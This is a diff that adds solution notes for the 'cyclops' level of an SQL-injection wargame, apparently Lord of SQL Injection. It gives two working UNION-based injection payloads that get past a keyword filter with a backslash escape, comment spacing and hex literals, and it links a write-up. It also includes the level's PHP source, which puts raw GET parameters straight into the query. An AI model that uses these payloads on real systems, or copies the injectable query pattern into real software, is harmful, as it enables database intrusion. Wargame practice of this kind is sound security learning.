@@ -1,0 +1,17 @@
+query : select id,pw from prob_cyclops where id='\' and pw='union/**/select/**/0x6669727374 x,0x7365636F6E64#'
+another solution: select id,pw from prob_cyclops where id='\' and pw='<@=1 union/**/select 'first','second' #'
+                  https://blog.hamayanhamayan.com/entry/2020/08/12/191735
+
+CYCLOPS Clear!
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id,pw from prob_cyclops where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(($result['id'] === "first") && ($result['pw'] === "second")) solve("cyclops");//must use union select
+  highlight_file(__FILE__);
+?>
